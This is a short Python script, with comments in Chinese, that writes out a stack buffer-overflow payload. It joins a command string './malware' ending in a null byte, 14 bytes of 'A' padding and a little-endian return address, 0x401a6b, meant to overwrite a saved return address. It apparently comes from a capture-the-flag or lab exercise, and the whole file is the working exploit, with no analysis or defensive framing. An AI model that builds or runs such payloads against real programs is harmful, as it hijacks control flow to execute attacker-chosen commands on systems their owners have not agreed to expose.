#!/usr/bin/env python3
import sys

# 1. 恶意命令 + \x00 截断符 (10 字节)
cmd = b"./malware\x00"

# 2. 填充数据：总共需要 24 字节。已经有 10 字节了，还差 14 个 A
padding = b'A' * 14

# 3. 覆盖返回地址为 0x401a6b
ret_addr = b'\x6b\x1a\x40\x00\x00\x00\x00\x00'

# 组装
payload = cmd + padding + ret_addr

sys.stdout.buffer.write(payload)